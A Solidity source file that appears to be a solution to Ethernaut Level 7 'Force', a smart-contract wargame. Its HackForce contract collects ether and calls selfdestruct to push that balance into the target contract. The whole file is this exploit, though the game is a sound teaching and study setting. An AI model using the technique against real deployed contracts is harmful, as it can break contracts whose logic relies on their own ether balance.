// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @notice Inteface relating to the Force contract found in Ethernaut Level 7
 * @notice Full contract can be found in the ethernaut directory of this repo 
 */
interface IForce {
    // Empty interface
}

contract HackForce {
    IForce private immutable _force;

    constructor(address forceAddress) {
        _force = IForce(forceAddress);
    }

    function donate() public payable {
        require(msg.value > 0, "Must send at least 1 wei");
    }

    function attack() public {
        require(address(this).balance > 0, "Balance is 0. Please donate in order to attack");
        selfdestruct(payable(address(_force)));
    }

}